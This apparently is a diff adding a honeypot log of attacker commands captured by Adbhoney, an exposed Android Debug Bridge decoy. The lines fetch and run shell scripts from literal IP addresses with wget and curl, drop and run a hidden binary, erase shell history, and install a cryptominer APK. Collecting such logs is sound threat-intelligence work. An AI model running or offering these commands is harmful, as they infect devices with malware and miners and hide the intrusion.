@@ -1,0 +1,21 @@
+Adbhoney Input - Command Line Inputs
+
+cd /data/local/tmp/; busybox wget http://205.185.121.185/w.sh; sh w.sh; curl http://205.185.121.185/c.sh; sh c.sh
+
+cd /data/local/tmp/; mkdir /var/tmp/.dev ; cd /var/tmp/.dev ; wget -q http://188.213.49.155/.doslas --no-check-certificate || curl -s -L -O http://188.213.49.155/.doslas ; chmod 777 .doslas ; ./.doslas ; ./.doslas ; rm -rf ~/.bash_history ; history -c
+
+cd /data/local/tmp/; wget http://213.32.101.152/w.sh; sh w.sh; curl http://213.32.101.152/c.sh; sh c.sh
+
+cd /data/local/tmp/; busybox wget http://198.98.62.92/w.sh; sh w.sh; curl http://198.98.62.92/c.sh; sh c.sh
+
+rm -rf /data/local/tmp/*
+
+cd /data/local/tmp/; busybox wget http://179.43.175.58/w.sh; sh w.sh; curl http://179.43.175.58/c.sh; sh c.sh
+
+am start -n com.ufo.miner/com.example.test.MainActivity
+
+chmod 0755 /data/local/tmp/nohup
+
+pm install /data/local/tmp/ufo.apk
+
+pm path com.ufo.miner
